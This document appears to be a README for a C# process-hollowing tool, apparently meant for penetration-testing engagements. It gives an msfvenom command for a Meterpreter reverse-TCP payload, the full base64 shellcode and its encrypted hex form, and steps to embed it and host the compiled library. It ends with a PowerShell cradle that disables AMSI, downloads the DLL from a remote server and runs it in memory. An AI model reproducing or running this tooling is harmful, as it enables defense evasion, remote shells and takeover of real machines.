# ProcessHollowing
Process hollowing C# code with shellcode encryptor

Update the rotations count to suit your needs in the CaesarEncryptShell function and PFuncs.cs Decrypt functions
The 2 args for the Encryptor and Main payload are a password and byte array as a iv, just b64 the byte bag and pass as args similar to below

# Encrypt that payload

1: Generate a base64 msf shell
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=8080 -f base64
  
2: Create some Random Data as an iv
  echo gtukd|base64                                              
AGcABgUAdAAGBgB1AAYDAGsABgUAZA==

3: use the data above to create an encrypted and caesar encoded payload

.\ShellCodeEncrypter.exe "SomeRandomPassword123!" "AGcABgUAdAAGBgB1AAYDAGsABgUAZA==" "/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQSQHQi0gY41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB+QwKgCb0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"

OUTPUT:

[+] Caesar Encoding Payload
[+] Payload Is Caesar Encoded
[+] Encrypting Payload using AES 256!
[+] Hex Encoding AES Payload
[+] The Hex Encoded payload is:

0xb9,0xef,0xed,0xb4,0x61,0x72,0xd8,0x4b,0x90,0x2e,0xe2,0xf2,0xcf,0x17,0x2a,0x52,0x60,0x41,0x4a,0x1c,0xed,0x52,0x86,0xbb,0xe0,0x03,0xcc,0x43,0xf2,0xf6,0xe6,0x19,0xfa,0x48,0x6b,0x8a,0xef,0xfd,0x7e,0xf3,0x92,0x48,0xf1,0x2e,0x4f,0xf1,0x01,0x8b,0x19,0xbb,0x42,0x20,0x39,0x55,0xe5,0xdc,0x8d,0xb9,0xba,0x1f,0x10,0xf4,0xdf,0x43,0x06,0x7f,0x29,0xb8,0xdf,0x66,0xf5,0x9e,0x29,0x5e,0x61,0xae,0x8f,0xef,0x61,0x0e,0xfe,0x73,0xab,0xfb,0x60,0x6f,0x75,0x57,0x2a,0x49,0x4d,0x01,0x65,0x5e,0x78,0x31,0x2d,0xf8,0xd4,0x9c,0xb4,0xfb,0xc8,0x8f,0x97,0xcd,0x60,0x59,0x51,0x85,0xed,0xea,0x97,0x8e,0xc4,0xd8,0x68,0x3c,0x96,0xf2,0x82,0x70,0x78,0x28,0xb9,0xa2,0xf9,0xf1,0x72,0xda,0x4a,0xa0,0x5b,0xb1,0xd0,0x3a,0x3d,0x80,0xec,0xcf,0xdc,0xef,0x51,0x00,0x0a,0x14,0x55,0x37,0x9e,0x44,0x05,0x62,0x00,0xd2,0x59,0x25,0xfb,0x8d,0x0f,0xeb,0xe9,0x57,0xca,0x25,0x10,0xa5,0xf9,0x4f,0x70,0xc1,0x2f,0x00,0xd2,0x6b,0x8d,0xd6,0xd8,0x6b,0xc7,0x60,0xb5,0x89,0x54,0xf8,0xaf,0x0e,0x4b,0x81,0xfe,0xe7,0x91,0xc6,0xb5,0xa6,0x63,0xee,0x3d,0x6a,0x14,0xb0,0xc7,0xbc,0x9c,0x5f,0x71,0x31,0xc5,0x08,0x7e,0xe1,0x9f,0x29,0xb2,0xcb,0x75,0xa6,0x8b,0xf7,0x96,0xa0,0x4b,0xc9,0x82,0x97,0x21,0x94,0xe8,0xbb,0x4f,0x42,0x9e,0xec,0x00,0xac,0xa9,0x8c,0x14,0x4d,0x32,0x93,0x29,0x8e,0xd5,0xc0,0x60,0x69,0x4c,0x05,0xc6,0xcf,0x64,0xb1,0x9d,0x6f,0xd2,0x62,0xc9,0xac,0xdd,0xa2,0x66,0xdf,0x4d,0x68,0xd6,0x43,0x18,0x5c,0x68,0xe7,0x63,0x02,0x70,0x47,0xac,0xd1,0x0b,0xb8,0x7f,0x66,0xaa,0x91,0xc8,0x24,0xd6,0x9a,0x99,0x34,0x4a,0xf6,0xf2,0xf4,0xbc,0x92,0xf7,0x57,0xa1,0x67,0x7f,0xa9,0x85,0x6c,0xc5,0x5a,0xfc,0x16,0xec,0xfa,0xee,0x5d,0xf2,0x19,0xdd,0xa8,0x92,0x52,0x07,0xef,0x5a,0x2a,0x9c,0xb1,0x35,0x68,0xb1,0x81,0xb2,0xa9,0xd6,0x4f,0x67,0x58,0x59,0x3b,0x2c,0x69,0x10,0x90,0x53,0x2c,0x10,0xda,0xf5,0x4b,0x55,0x88,0x12,0x13,0x47,0x0b,0x8e,0x6e,0xfb,0x59,0xb8,0x68,0x81,0xc3,0x1f,0x97,0xec,0x4c,0x9a,0xe2,0xa6,0xe2,0xd9,0x48,0x84,0x1a,0xc7,0x0f,0x2f,0x45,0xe5,0x70,0x98,0xcb,0x1a,0x02,0x9a,0x38,0x9c,0xe3,0xe4,0x74,0xe5,0x54,0x45,0xeb,0x80,0x2c,0xee,0x4f,0xbe,0x89,0x83,0xf9,0x62,0xcf,0x49,0x06,0x3e,0xb2,0x81,0x84,0x00,0xc9,0xb1,0xe3,0x45,0x2a,0xa5,0x5e,0x35,0xc9,0x2c,0xb0,0xf3,0xd1,0x0c,0x61,0x1e,0x31,0xdb,0x6c,0x53,0x16,0x2e,0xec,0x2d,0x80,0x50,0x1d,0xc2,0x91,0xd8,0x65,0xe0,0x2c,0xde,0x99,0x04,0x95,0xe1,0xa1,0xcf,0x0b,0x07,0xce,0x99,0x07,0x08,0xd5,0x65,0xb7,0x0e,0x8c,0x9d,0x0f,0xc9,0xd2,0xe3,0x4e,0x95,0x70,0x61,0xe2,0x46,0x66,0x5d,0xbf,0xb5,0xa4,0xb2,0x62,0x3d,0x70,0x04,0x5c,0xe2,0xeb,0xe8,0x08,0x33,0xb7,0x51,0x09,0x42,0x18,0x2a,0x06,0xf6,0x47,0xd9,0x62,0xed,0x42,0x30,0x62,0xcd,0xf8,0x89,0xfc,0xa8,0x84,0x00,0xfc,0x99,0x6f,0x22,0xfa,0xdb,0x10,0xf1,0x69,0xe3,0xde,0xc5,0x33,0x6a,0x5d,0xc1,0xa7,0x7e,0xb2,0x45,0xfa,0x3e,0x8d,0x4d,0x0e,0x2a,0x96,0xeb,0xd5,0x73,0x23,0x90,0xbe,0x71,0xb0,0x00,0x0d,0xac,0xf1,0x80,0x7d,0x5d,0x51,0x80,0x6c,0xfd,0x35,0xbf,0x52,0x99,0xa6,0x9b,0x98,0x07,0xb2,0x37,0x0e,0x55,0x47,0x76,0xe3,0x06,0x5a,0x2f,0xb4,0xc2,0x09,0xa1,0xaa,0x0c,0x2a,0xd7,0x89,0x64,0x4c,0xfa,0x61,0x8d,0xb2,0x10,0x6d,0x40,0xe3,0xbe,0xd6,0xb3,0xa7,0x8f,0x38,0x70,0xcc,0x0c,0x8d,0x56,0xc4,0xad,0x37,0x5c,0xb3,0x15,0xce,0x46,0xce,0xd6,0xa5,0xf1,0x0e,0x9b,0x3f,0xdc,0xee,0xf8,0x1c,0x99,0x36,0xbb,0x00,0x17,0x8c,0x72,0xbe,0x17,0xa1,0x9b,0xbb,0xb8,0x8c,0x48,0x22,0x25,0x22,0x6a,0xf0,0xc5,0xee,0x0c,0x7d,0x3c,0x8e,0x04,0x72,0x9e,0x0c,0xc4,0x06,0xba,0x45,0x93,0x8c,0x42,0xe3,0xab,0x5e,0xe3,0x01,0x5d,0x82,0xe3,0xe8,0x31,0xb9,0x62,0x30,0xe5,0x8d,0x9c,0xb9,0xc8,0x6b,0x41,0x5b,0xfa,0xb2,0x97,0xb1,0x97,0x6d,0xde,0x14,0x29,0x31,0xda,0xc0,0x00,0xdb,0x95,0xdb,0x25,0xdd,0x72,0xce,0xb7,0xd3,0x2c,0xaf,0x7d,0x52,0xe2,0xf4,0xb2,0xfa,0x45,0x02,0xfe,0x61,0xe7,0x7c,0xca,0xe5,0xf0,0xf3,0x93,0xc3,0x92,0x59,0x8f,0xbf,0x26,0x3c,0xb6,0xc0,0xd2,0xf5,0x03,0xe0,0xa4,0x19,0x77,0xac,0xd5,0xa9,0x13,0x19,0xe7,0x00,0x3d,0xe5,0x83,0xfe,0x8d,0xaa,0x39,0x07,0xd4,0xc9,0x01,0x48,0x1e,0x64,0x74,0x08,0xbb,0xc1,0xf4,0x52,0x34,0x2d,0x85,0x2e,0xfc,0x1d,0xcd,0xbf,0xef,0xbc,0x9e,0x90,0xee,0x57,0x18,0x3e,0x0b,0xb1,0xa1,0xbb,0x73,0xd7,0x61,0x76,0x04,0x7e,0xb1,0xa6,0x32,0xf7,0xa3,0xf6,0xea,0xda,0x1a,0x70,0x4d,0x5b,0x1e,0x2d,0x6a,0xd7,0x0f,0x49,0x78,0x3b,0x55,0xee,0x16,0x6c,0x99,0xb3,0x50,0x1b,0x4f,0x15,0xc5,0x14,0xab,0xcf,0x45,0x62,0xae,0x84,0xd1,0x91,0xda,0xb4,0x61,0x5a,0x28,0xb7,0x4a,0x95,0x76,0x2f,0xec,0xbd,0x4d,0x46,0x54,0x24,0x89,0x39,0x73,0x20,0x06,0x05,0xd5,0xb3,0x1c,0xf2,0x89,0xb7,0x7f,0xc6,0x9b,0x6c,0xf3,0xeb,0xcc,0x3b,0x9a,0x8c,0x15,0xa2,0x0a,0xcf,0x5f,0x81,0xc6,0x78,0x98,0x58,0x42,0xd1,0x38,0x8c,0x43,0xe1,0x08,0xa4,0x46,0x67,0x8c,0x38,0x36,0x98,0xea,0x69,0x32,0xcb,0x82,0x71,0x5d,0x5a,0x8e,0x7d,0xb3,0x7f,0xc1,0xf0,0x20,0x51,0x91,0x1e,0x8e,0x58,0x79,0xf8,0x8f,0x62,0x71,0x71,0x23,0x02,0x7f,0x53,0x29,0xa0,0x73,0xe9,0x0d,0x6e,0xce,0xb7,0x56,0x2d,0xbf,0x9a,0x83,0x03,0x37,0xc6,0x24,0xb1,0x70,0x45,0x73,0x6a,0x47,0xf8,0x1f,0x64,0x97,0x39,0xab,0xe0,0x26,0xd7,0x88,0x3a,0xd2,0x7d,0x46,0xa9,0x28,0x75,0x09,0x6e,0xcf,0xa7,0x64,0xdb,0x00,0x36,0xd8,0x9c,0xad,0x43,0x00,0x38,0xd9,0x37,0xe7,0xe1,0x4b,0x58,0xa9,0x5f,0xb5,0xee,0xb5,0x69,0x8f,0x43,0x12,0x2d,0xef,0x5b,0xa1,0x49,0x88,0xa9,0x6a,0x02,0xaf,0x67,0x29,0xc7,0xa1,0x23,0x62,0x01,0xc9,0x28,0x13,0xbf,0xc9,0x25,0x3d,0x7c,0x06,0x2d,0x9a,0xf0,0x99,0xd2,0xc9,0xe0,0xd4,0x63

4: Copy the byte bag.


# Update Process Hollower

1: Open the processhollower project in visual studio 2019.

2: Update the deployment method ie lib or exe main methods with the C# byte bag received from the encryptor (its obvious just look at entry points)

3: Compile and place the libs in a webserver or other location ready for deployment


# Powershell cradle for Loading the dll

The project includes a ProcessHollowingLib.dll file to load that up during engagement into memory use the following code

```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.2.111/ProcessHollowingLib.dll');
$assem = [System.Reflection.Assembly]::Load($data); 
$class = $assem.GetType("ProcessHollowingLib.ProcHollower"); 
$class.GetProperty('Password').SetValue(0,'SomeRandomPassword123!');
$class.GetProperty('IV').SetValue(0,'AGcABgUAdAAGBgB1AAYDAGsABgUAZA==');
$method = $class.GetMethod("DoWork"); 
$method.Invoke(0,$null)
```
